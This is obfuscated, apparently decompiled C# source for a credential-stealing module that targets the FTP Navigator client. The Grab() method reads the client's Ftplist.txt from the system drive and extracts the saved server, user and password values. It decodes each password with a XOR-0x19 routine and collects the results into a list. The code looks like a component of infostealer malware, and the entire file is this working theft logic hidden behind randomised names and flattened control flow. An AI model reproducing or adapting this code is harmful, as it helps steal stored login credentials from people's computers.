using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using p3N5Y;

namespace ZAZUx;

public class wFi98 : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string GIG7OkTfB
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public wFi98()
	{
		GIG7OkTfB = "FTP Navigator";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		string text = default;
		string[] array = default;
		int num2 = default;
		int num3 = default;
		string text2 = default;
		string[] array2 = default;
		string username = default;
		string path = default;
		List<ii68> list = default;
		string host = default;
		string password = default;
		string[] array3 = default;
		string text3 = default;
		string[] array4 = default;
		string[] array5 = default;
		while (true)
		{
			if (num == 19)
			{
				goto IL_0477;
			}
			if (num == 25)
			{
				goto IL_003e;
			}
			goto IL_0050;
			IL_0084:
			text = array[num2];
			num = 11;
			goto IL_009a;
			IL_0050:
			if (num == 13)
			{
				num3 = 0;
				num = 14;
			}
			if (num == 10)
			{
				goto IL_0084;
			}
			goto IL_009a;
			IL_0500:
			if (num == 14)
			{
				goto IL_02ad;
			}
			if (num == 24)
			{
				goto IL_0477;
			}
			if (num == 21)
			{
				text2 = array2[1];
				num = 22;
			}
			if (num == 4)
			{
				username = string.Empty;
				num = 5;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 34)
			{
				break;
			}
			continue;
			IL_01ec:
			if (array2[0] == "Password")
			{
				num = 21;
				goto IL_020e;
			}
			goto IL_03f4;
			IL_009a:
			if (num == 33)
			{
				goto IL_00ab;
			}
			goto IL_00c3;
			IL_00c3:
			if (num == 17)
			{
				if (!(array2[0] == "Server"))
				{
					goto IL_01ec;
				}
				num = 18;
			}
			if (num == 1)
			{
				path = Environment.GetEnvironmentVariable("SystemDrive") + "\\FTP Navigator\\Ftplist.txt";
				num = 2;
			}
			if (num == 31)
			{
				list.Add(new ii68
				{
					byIdLuuGZbL = host,
					S8v = username,
					_9H5rP7hg2 = password,
					oVAe = GIG7OkTfB
				});
				num = 32;
			}
			if (num == 7)
			{
				array = array3;
				num = 8;
			}
			if (num == 32)
			{
				num2++;
				num = 33;
			}
			if (num == 20)
			{
				goto IL_01ec;
			}
			goto IL_020e;
			IL_048e:
			if (num == 28)
			{
				username = array2[1];
				num = 29;
			}
			if (num == 2)
			{
				list = new List<ii68>();
				num = 3;
			}
			if (num == 15)
			{
				goto IL_04ea;
			}
			goto IL_0500;
			IL_04ea:
			text3 = array4[num3];
			num = 16;
			goto IL_0500;
			IL_020e:
			if (num == 16)
			{
				array2 = text3.Split(new char[1] { '=' });
				num = 17;
			}
			if (num == 23)
			{
				password = FpALQAF2BpU(text2);
				num = 24;
			}
			if (num == 26)
			{
				goto IL_0477;
			}
			if (num == 30)
			{
				goto IL_02ad;
			}
			goto IL_02c5;
			IL_02ad:
			if (num3 >= array4.Length)
			{
				num = 31;
				goto IL_02c5;
			}
			goto IL_04ea;
			IL_03f4:
			if (array2[0] == "User")
			{
				num = 28;
				goto IL_0416;
			}
			goto IL_0477;
			IL_02c5:
			if (num == 9)
			{
				goto IL_00ab;
			}
			if (num == 11)
			{
				array5 = text.Split(new char[1] { ';' });
				num = 12;
			}
			if (num == 6)
			{
				array3 = File.ReadAllLines(path);
				num = 7;
			}
			if (num == 12)
			{
				array4 = array5;
				num = 13;
			}
			if (num == 3)
			{
				host = string.Empty;
				num = 4;
			}
			if (num == 8)
			{
				num2 = 0;
				num = 9;
			}
			if (num == 18)
			{
				host = array2[1];
				num = 19;
			}
			if (num == 27)
			{
				goto IL_03f4;
			}
			goto IL_0416;
			IL_003e:
			password = "No Password";
			num = 26;
			goto IL_0050;
			IL_0477:
			num3++;
			num = 30;
			goto IL_048e;
			IL_00ab:
			if (num2 < array.Length)
			{
				goto IL_0084;
			}
			num = 34;
			goto IL_00c3;
			IL_0416:
			if (num == 22)
			{
				if (text2.Length <= 2)
				{
					goto IL_003e;
				}
				num = 23;
			}
			if (num == 5)
			{
				password = string.Empty;
				num = 6;
			}
			if (num == 29)
			{
				goto IL_0477;
			}
			goto IL_048e;
		}
		return list;
	}

	private static string FpALQAF2BpU(string sUo9QrYiyw)
	{
		int num = 0;
		string text = default;
		do
		{
			if (num == 1)
			{
				text = "";
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		try
		{
			foreach (char c in sUo9QrYiyw)
			{
				text += Convert.ToChar(c ^ 0x19);
			}
		}
		catch
		{
		}
		return text;
	}
}
